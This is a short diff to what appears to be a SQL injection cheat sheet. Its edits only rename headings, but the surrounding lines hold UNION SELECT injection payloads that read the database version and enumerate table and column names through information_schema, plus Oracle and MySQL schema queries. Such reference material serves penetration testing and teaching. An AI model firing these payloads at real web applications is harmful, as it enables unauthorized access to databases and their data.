@@ -51,7 +51,7 @@ example
 ' UNION SELECT NULL,NULL,version()#
 ~~~
 
-### Database tables
+### Database tables & columns
 ~~~
 Oracle 	    SELECT * FROM all_tables
             SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
@@ -66,12 +66,12 @@ MySQL 	    SELECT * FROM information_schema.tables
             SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
 ~~~
 
-example
+example tables
 ~~~
 ' UNION SELECT NULL,NULL,table_name from information_schema.tables#
 ~~~
-### Database columns
-example
+
+example columns
 ~~~
 ' UNION SELECT NULL,NULL,column_name from information_schema.columns#
 ~~~
